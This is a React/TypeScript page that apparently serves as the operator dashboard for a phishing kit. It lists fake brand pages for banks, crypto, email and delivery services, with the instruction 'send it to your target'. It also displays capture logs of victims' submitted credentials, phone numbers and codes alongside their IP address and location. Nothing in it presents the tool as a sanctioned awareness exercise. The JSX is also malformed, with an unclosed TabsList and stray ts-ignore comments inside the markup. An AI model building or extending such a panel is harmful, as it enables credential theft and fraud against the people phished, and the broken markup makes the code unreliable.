// frontend/src/pages/Phishing.tsx
import { useCallback, useEffect, useState } from 'react';
import {
  ChevronLeft, ChevronRight, Copy, Database, ExternalLink, Loader2,
  Power, RefreshCw, ShieldAlert, Trash2,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import {
  Card, CardContent, CardDescription, CardHeader, CardTitle,
} from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import {
  Table, TableBody, TableCell, TableHead, TableHeader, TableRow,
} from '@/components/ui/table';
import { Tabs, TabsContent, TabsList, TabsTrigger,
} from '@/components/ui/tabs';
import { phishingApi } from '@/services/api';
import { useAuthStore } from '@/store/auth';
import type { Permission } from '@/types';

// --- types -------------------------------------------------------------

interface PhishingPageRow {
  id: number;
  slug: string;
  brand: string;
  category: string;
  variant: string;
  title: string;
  hits: number;
  enabled: number;
  createdAt: string | null;
  url: string;
}

interface PhishingLogRow {
  id: number;
  pageId: number | null;
  slug: string;
  brand: string;
  variant: string;
  ip: string;
  userAgent: string;
  fields: Record<string, unknown>;
  meta: Record<string, unknown>;
  country: string | null;
  city: string | null;
  createdAt: string | null;
}

interface PhishingStats {
  totalPages: number;
  enabledPages: number;
  totalHits: number;
  totalCaptures: number;
  capturesToday: number;
  variants: number;
  topPages: { slug: string; brand: string; variant: string; captures: number }[];
  byCategory: { category: string; count: number }[];
}

// --- constants ----------------------------------------------------------

const CATEGORIES = [
  'banking', 'social', 'streaming', 'shopping', 'email', 'delivery',
  'security', 'crypto', 'telecom', 'gaming', 'saas',
];

const CATEGORY_LABELS: Record<string, string> = {
  banking: 'Banking', social: 'Social', streaming: 'Streaming', shopping: 'Shopping',
  email: 'Email', delivery: 'Delivery', security: 'Security', crypto: 'Crypto',
  telecom: 'Telecom', gaming: 'Gaming', saas: 'SaaS',
};

function formatDate(value: string | null): string {
  if (!value) return '—';
  const d = new Date(value.includes('T') ? value : `${value.replace(' ', 'T')}Z`);
  if (Number.isNaN(d.getTime())) return value;
  return d.toLocaleString();
}

// --- component -----------------------------------------------------------

export default function PhishingPage() {
  const { hasPermission } = useAuthStore();
  const canManage = hasPermission('phishing:manage' as Permission);

  // pages state
  const [pages, setPages] = useState<PhishingPageRow[]>([]);
  const [pagesTotal, setPagesTotal] = useState(0);
  const [pagesLoading, setPagesLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [pageSize] = useState(20);
  const [searchInput, setSearchInput] = useState('');
  const [search, setSearch] = useState('');
  const [category, setCategory] = useState('all');
  const [enabledFilter, setEnabledFilter] = useState('all');

  // logs state
  const [logs, setLogs] = useState<PhishingLogRow[]>([]);
  const [logsTotal, setLogsTotal] = useState(0);
  const [logsLoading, setLogsLoading] = useState(true);
  const [logPage, setLogPage] = useState(1);
  const [logSearch, setLogSearch] = useState('');

  // stats + actions state
  const [stats, setStats] = useState<PhishingStats | null>(null);
  const [seedState, setSeedState] = useState<{ loading: boolean; message: string | null }>({ loading: false, message: null });
  const [busyId, setBusyId] = useState<number | null>(null);
  const [confirmDeleteId, setConfirmDeleteId] = useState<number | null>(null);
  const [confirmClear, setConfirmClear] = useState(false);
  const [copiedId, setCopiedId] = useState<number | null>(null);

  const loadStats = useCallback(async () => {
    try {
      const res = await phishingApi.getStats();
      setStats((res.data as { data?: PhishingStats }).data ?? null);
    } catch {
      // stats are non-critical
    }
  }, []);

  const loadPages = useCallback(async () => {
    setPagesLoading(true);
    try {
      const res = await phishingApi.getPages({
        page,
        pageSize,
        search: search || undefined,
        category: category === 'all' ? undefined : category,
        enabled: enabledFilter === 'all' ? undefined : enabledFilter === 'enabled' ? '1' : '0',
      });
      const data = (res.data as { data?: { pages: PhishingPageRow[]; total: number } }).data;
      setPages(data?.pages ?? []);
      setPagesTotal(data?.total ?? 0);
    } catch {
      setPages([]);
      setPagesTotal(0);
    } finally {
      setPagesLoading(false);
    }
  }, [page, pageSize, search, category, enabledFilter]);

  const loadLogs = useCallback(async () => {
    setLogsLoading(true);
    try {
      const res = await phishingApi.getLogs({
        page: logPage,
        pageSize: 20,
        search: logSearch || undefined,
      });
      const data = (res.data as { data?: { logs: PhishingLogRow[]; total: number } }).data;
      setLogs(data?.logs ?? []);
      setLogsTotal(data?.total ?? 0);
    } catch {
      setLogs([]);
      setLogsTotal(0);
    } finally {
      setLogsLoading(false);
    }
  }, [logPage, logSearch]);

  useEffect(() => { loadPages(); }, [loadPages]);
  useEffect(() => { loadLogs(); }, [loadLogs]);
  useEffect(() => { loadStats(); }, [loadStats]);

  // debounce search input
  useEffect(() => {
    const t = setTimeout(() => {
      setSearch(searchInput);
      setPage(1);
    }, 350);
    return () => clearTimeout(t);
  }, [searchInput]);

  const refreshAll = useCallback(() => {
    loadPages();
    loadLogs();
    loadStats();
  }, [loadPages, loadLogs, loadStats]);

  const handleSeed = async () => {
    setSeedState({ loading: true, message: null });
    try {
      const res = await phishingApi.seed();
      const data = (res.data as { data?: { created: number; updated: number; total: number } }).data;
      setSeedState({ loading: false, message: `Seeded ${data?.total ?? 'all'} pages (${data?.created ?? 0} new, ${data?.updated ?? 0} updated)` });
      loadStats();
    } catch {
      setSeedState({ loading: false, message: 'Seed failed — check server logs' });
    }
  };

  const handleToggle = async (row: PhishingPageRow) => {
    if (busyId) return;
    setBusyId(row.id);
    try {
      await phishingApi.togglePage(row.id, row.enabled !== 1);
      loadPages();
      loadStats();
    } catch { /* ignore */ }
    setBusyId(null);
  };

  const handleDelete = async (row: PhishingPageRow) => {
    if (confirmDeleteId !== row.id) { setConfirmDeleteId(row.id); return; }
    setConfirmDeleteId(null);
    setBusyId(row.id);
    try {
      await phishingApi.deletePage(row.id);
      loadPages();
      loadStats();
    } catch { /* ignore */ }
    setBusyId(null);
  };

  const handleClearLogs = async () => {
    if (!confirmClear) { setConfirmClear(true); return; }
    setConfirmClear(false);
    try {
      await phishingApi.clearLogs();
      loadLogs();
      loadStats();
    } catch { /* ignore */ }
  };

  const copyUrl = async (id: number, url: string) => {
    try {
      await navigator.clipboard.writeText(url);
      setCopiedId(id);
      setTimeout(() => setCopiedId(null), 1500);
    } catch { /* ignore */ }
  };

  const totalPagesCount = Math.max(1, Math.ceil(pagesTotal / pageSize));
  const totalLogPages = Math.max(1, Math.ceil(logsTotal / 20));

  return (
    <div className="space-y-6 p-6">
      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <h1 className="text-2xl font-bold flex items-center gap-2">
            <ShieldAlert className="h-6 w-6 text-primary" />
            Phishing Campaigns
          </h1>
          <p className="text-muted-foreground text-sm">
            Hosted brand pages, capture logs, and campaign statistics.
          </p>
        </div>
        <div className="flex items-center gap-2">
          {canManage && (
            <Button onClick={handleSeed} disabled={seedState.loading}>
              {seedState.loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Database className="h-4 w-4" />}
              {seedState.loading ? 'Seeding…' : 'Seed pages'}
            </Button>
          )}
          <Button variant="outline" onClick={refreshAll} disabled={pagesLoading || logsLoading}>
            <RefreshCw className="h-4 w-4" />
            Refresh
          </Button>
        </div>
      </div>

      {seedState.message && (
        <div className="text-sm text-muted-foreground">{seedState.message}</div>
      )}

      {/* stats */}
      <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-6">
        <StatCard label="Pages" value={stats ? String(stats.totalPages) : '—'} />
        <StatCard label="Enabled" value={stats ? String(stats.enabledPages) : '—'} />
        <StatCard label="Total hits" value={stats ? String(stats.totalHits) : '—'} />
        <StatCard label="Captures" value={stats ? String(stats.totalCaptures) : '—'} />
        <StatCard label="Last 24h" value={stats ? String(stats.capturesToday) : '—'} />
        <StatCard label="Variants" value={stats ? String(stats.variants) : '—'} />
      </div>

      <Tabs defaultValue="pages">
        <TabsList>
          <TabsTrigger value="pages">Pages ({pagesTotal})</TabsTrigger>
          <TabsTrigger value="logs">Capture logs ({logsTotal})</TabsTrigger>
        <TabsList>
          // @ts-ignore
        <TabsContent value="pages" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Pages</CardTitle>
              <CardDescription>
                {pagesTotal} pages generated from the brand database. Copy a link and send it to your target.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex flex-col gap-3 sm:flex-row">
                <Input
                  placeholder="Search brand or slug…"
                  value={searchInput}
                  onChange={(e) => setSearchInput(e.target.value)}
                  className="sm:max-w-xs"
                />
                <select
                  className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                  value={category}
                  onChange={(e) => { setCategory(e.target.value); setPage(1); }}
                >
                  <option value="all">All categories</option>
                  {CATEGORIES.map((c) => (
                    <option key={c} value={c}>{CATEGORY_LABELS[c] ?? c}</option>
                  ))}
                </select>
                <select
                  className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
                  value={enabledFilter}
                  onChange={(e) => { setEnabledFilter(e.target.value); setPage(1); }}
                >
                  <option value="all">All states</option>
                  <option value="enabled">Enabled</option>
                  <option value="disabled">Disabled</option>
                </select>
              </div>

              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Brand</TableHead>
                    <TableHead>Slug</TableHead>
                    <TableHead>Variant</TableHead>
                    <TableHead>Category</TableHead>
                    <TableHead className="text-right">Hits</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead className="text-right">Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {pagesLoading ? (
                    <TableRow><TableCell colSpan={7} className="text-center text-muted-foreground py-8">Loading…</TableCell></TableRow>
                  ) : pages.length === 0 ? (
                    <TableRow><TableCell colSpan={7} className="text-center text-muted-foreground py-8">
                      {search || category !== 'all' || enabledFilter !== 'all'
                        ? 'No pages match the current filters.'
                        : 'No pages yet — click "Seed pages" to generate the full catalog.'}
                    </TableCell></TableRow>
                  ) : pages.map((row) => (
                    <TableRow key={row.id}>
                      <TableCell className="font-medium">{row.brand}</TableCell>
                      <TableCell className="font-mono text-xs">{row.slug}</TableCell>
                      <TableCell><Badge variant="outline">{row.variant}</Badge></TableCell>
                      <TableCell className="text-xs text-muted-foreground">{CATEGORY_LABELS[row.category] ?? row.category}</TableCell>
                      <TableCell className="text-right">{row.hits}</TableCell>
                      <TableCell>
                        <Badge variant={row.enabled === 1 ? 'default' : 'secondary'}>
                          {row.enabled === 1 ? 'Enabled' : 'Disabled'}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center justify-end gap-1">
                          <Button variant="ghost" size="icon" title="Copy link" onClick={() => copyUrl(row.id, row.url)}>
                            {copiedId === row.id ? <span className="text-xs text-green-500">✓</span> : <Copy className="h-4 w-4" />}
                          </Button>
                          <Button variant="ghost" size="icon" title="Open page" onClick={() => window.open(row.url, '_blank')}>
                            <ExternalLink className="h-4 w-4" />
                          </Button>
                          {canManage && (
                            <>
                              <Button variant="ghost" size="icon" title={row.enabled === 1 ? 'Disable' : 'Enable'} onClick={() => handleToggle(row)} disabled={busyId === row.id}>
                                {busyId === row.id ? <Loader2 className="h-4 w-4 animate-spin" /> : <Power className="h-4 w-4" />}
                              </Button>
                              <Button
                                variant="ghost" size="icon" title="Delete"
                                onClick={() => handleDelete(row)}
                                disabled={busyId === row.id}
                                className={confirmDeleteId === row.id ? 'text-red-500' : ''}
                              >
                                <Trash2 className="h-4 w-4" />
                              </Button>
                            </>
                          )}
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>

              <div className="flex items-center justify-between">
                <span className="text-sm text-muted-foreground">
                  Page {page} of {totalPagesCount} · {pagesTotal} total
                </span>
                <div className="flex gap-2">
                  <Button variant="outline" size="sm" disabled={page <= 1} onClick={() => setPage((p) => Math.max(1, p - 1))}>
                    <ChevronLeft className="h-4 w-4" /> Prev
                  </Button>
                  <Button variant="outline" size="sm" disabled={page >= totalPagesCount} onClick={() => setPage((p) => p + 1)}>
                    Next <ChevronRight className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
        // @ts-ignore
      <TabsContent value="logs" className="space-y-4">
          <Card>
            <CardHeader>
              <div className="flex items-center justify-between">
                <div>
                  <CardTitle>Capture logs</CardTitle>
                  <CardDescription>Every submitted credential, phone, or code.</CardDescription>
                </div>
                {canManage && (
                  <Button variant="destructive" size="sm" onClick={handleClearLogs}>
                    {confirmClear ? 'Click again to confirm' : 'Clear all'}
                  </Button>
                )}
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              <Input
                placeholder="Search brand or IP…"
                value={logSearch}
                onChange={(e) => { setLogSearch(e.target.value); setLogPage(1); }}
                className="sm:max-w-xs"
              />
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Time</TableHead>
                    <TableHead>Brand</TableHead>
                    <TableHead>Slug</TableHead>
                    <TableHead>IP / Location</TableHead>
                    <TableHead>Captured data</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {logsLoading ? (
                    <TableRow><TableCell colSpan={5} className="text-center text-muted-foreground py-8">Loading…</TableCell></TableRow>
                  ) : logs.length === 0 ? (
                    <TableRow><TableCell colSpan={5} className="text-center text-muted-foreground py-8">No captures yet.</TableCell></TableRow>
                  ) : logs.map((row) => (
                    <TableRow key={row.id}>
                      <TableCell className="text-xs whitespace-nowrap">{formatDate(row.createdAt)}</TableCell>
                      <TableCell className="font-medium">{row.brand}</TableCell>
                      <TableCell className="font-mono text-xs">{row.slug}</TableCell>
                      <TableCell className="text-xs">
                        <span className="font-mono">{row.ip || '—'}</span>
                        {row.country && <span className="text-muted-foreground"> · {row.country}{row.city ? `, ${row.city}` : ''}</span>}
                      </TableCell>
                      <TableCell>
                        <details>
                          <summary className="cursor-pointer text-xs text-primary">View fields</summary>
                          <pre className="mt-2 max-h-48 overflow-auto rounded bg-muted p-2 text-xs">
                            {JSON.stringify(row.fields, null, 2)}
                          </pre>
                        </details>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>

              <div className="flex items-center justify-between">
                <span className="text-sm text-muted-foreground">
                  Page {logPage} of {totalLogPages} · {logsTotal} total
                </span>
                <div className="flex gap-2">
                  <Button variant="outline" size="sm" disabled={logPage <= 1} onClick={() => setLogPage((p) => Math.max(1, p - 1))}>
                    <ChevronLeft className="h-4 w-4" /> Prev
                  </Button>
                  <Button variant="outline" size="sm" disabled={logPage >= totalLogPages} onClick={() => setLogPage((p) => p + 1)}>
                    Next <ChevronRight className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>

      {stats && stats.byCategory.length > 0 && (
        <Card>
          <CardHeader><CardTitle>Pages by category</CardTitle></CardHeader>
          <CardContent className="flex flex-wrap gap-2">
            {stats.byCategory.map((c) => (
              <Badge key={c.category} variant="outline">
                {CATEGORY_LABELS[c.category] ?? c.category}: {c.count}
              </Badge>
            ))}
          </CardContent>
        </Card>
      )}

      {stats && stats.topPages.length > 0 && (
        <Card>
          <CardHeader><CardTitle>Top captured pages</CardTitle></CardHeader>
          <CardContent className="space-y-2">
            {stats.topPages.map((t) => (
              <div key={t.slug} className="flex items-center justify-between text-sm">
                <span className="font-medium">{t.brand}</span>
                <span className="font-mono text-xs text-muted-foreground">{t.slug}</span>
                <Badge variant="secondary">{t.captures} captures</Badge>
              </div>
            ))}
          </CardContent>
        </Card>
      )}
    </div>
  );
}

function StatCard({ label, value }: { label: string; value: string }) {
  return (
    <Card>
      <CardContent className="p-4">
        <div className="text-sm text-muted-foreground">{label}</div>
        <div className="text-2xl font-bold">{value}</div>
      </CardContent>
    </Card>
  );
}  
